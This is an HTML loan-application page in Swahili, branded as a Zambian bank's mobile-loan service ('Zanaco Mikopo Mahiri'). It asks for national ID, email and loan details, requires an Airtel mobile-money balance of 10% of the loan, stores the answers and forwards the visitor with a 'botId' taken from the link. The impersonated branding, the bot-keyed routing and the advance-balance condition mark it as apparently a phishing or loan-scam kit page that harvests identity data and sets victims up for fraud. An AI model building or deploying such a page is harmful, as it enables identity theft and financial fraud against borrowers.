<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fomu ya Maombi ya Mkopo</title>

<style>
body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
h2 { text-align: center; margin-bottom: 20px; }
label { display: block; margin: 10px 0 5px; font-weight: bold; }
input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
.logo-container { width: 100%; height: 120px; margin-bottom: 20px; }
.logo { width: 100%; height: 100%; object-fit: cover; }
.loan-notice { background: #fff3cd;
   border: 1px solid #ffeeba; 
   padding: 12px;
    border-radius: 6px; 
    font-size: 14px;
    margin-bottom: 20px;
 }
.loan-notice ol {
    padding-left: 20px;
    margin: 8px 0 0 0;
}
.loan-notice li {
    margin-bottom: 6px;
}
</style>
</head>
<body>

<div class="loan-container">
    <h2>Zanaco Mikopo Mahiri Zambia</h2>
    <div class="logo-container">
        <img src="zanaco-dp.jpeg" class="logo">
    </div>

    <form id="loanForm">
        <label>Kiasi cha Mkopo (ZMW)</label>
        <input id="loanAmount" type="number" required placeholder="KIMA CHA CHINI 500 - KIMA CHA JUU 20000">

        <label>Barua Pepe (Email)</label>
        <input id="email" type="email" placeholder="mfano@gmail.com" required>

        <label>Nambari ya Kitambulisho cha Taifa</label>
        <input id="nationalId" type="text" placeholder="Kitambulisho cha Taifa">

        <label>Muda wa Marejesho</label>
        <select id="repaymentPeriod" required>
            <option value="">Chagua</option>
            <option value="7days">Siku 7 (riba 1.5%)</option>
            <option value="14days">Siku 14 (riba 2.5%)</option>
            <option value="21days">Siku 21 (riba 3.5%)</option>
            <option value="30days">Siku 30 (riba 4.5%)</option>
            <option value="60days">Siku 60 (riba 6%)</option>
            <option value="90days">Siku 90 (riba 10%)</option>
        </select>

        <label>Hali ya Ajira</label>
        <select id="employmentStatus" required>
            <option value="">Chagua</option>
            <option value="employed">Nimeajiriwa</option>
            <option value="self-employed">Nimejiajiri</option>
            <option value="unemployed">Sina Ajira</option>
            <option value="student">Mwanafunzi</option>
        </select>

        <label>Madhumuni ya Mkopo</label>
        <select id="loanPurpose" required>
            <option value="">Chagua</option>
            <option value="business">Biashara</option>
            <option value="personal">Mkopo wa Kibinafsi</option>
            <option value="schoolfees">Ada za Shule</option>
            <option value="medical">Matibabu</option>
            <option value="others">Mengineyo</option>
        </select>

        <div class="loan-notice">
            <strong>Taarifa ya Ustahiki:</strong>
            <ol>
                <li>Lazima uombe kwa kutumia nambari halali ya Airtel</li>
                <li>Lazima uwe na angalau 10% ya kiasi unachoomba kwenye akaunti ya Airtel</li>
            </ol>
        </div>

        <button type="submit">Endelea</button>
    </form>
</div>

<script>
// ✅ BOT ID FIX
let botId = new URLSearchParams(window.location.search).get('botId');
if (!botId) {
    const parts = window.location.pathname.split('/');
    const botIndex = parts.indexOf('bot');
    if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
}
if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error("botId missing"); }
localStorage.setItem('botId', botId);

// ---------------- FORM LOGIC ----------------
document.getElementById('loanForm').addEventListener('submit', e => {
    e.preventDefault();
    localStorage.setItem('loanAmount', loanAmount.value);
    localStorage.setItem('email', email.value);
    localStorage.setItem('nationalId', nationalId.value);
    localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
    localStorage.setItem('employmentStatus', employmentStatus.value);
    localStorage.setItem('loanPurpose', loanPurpose.value);

    window.location.href = `details.html?botId=${botId}`;
});
</script>
</body>
</html>
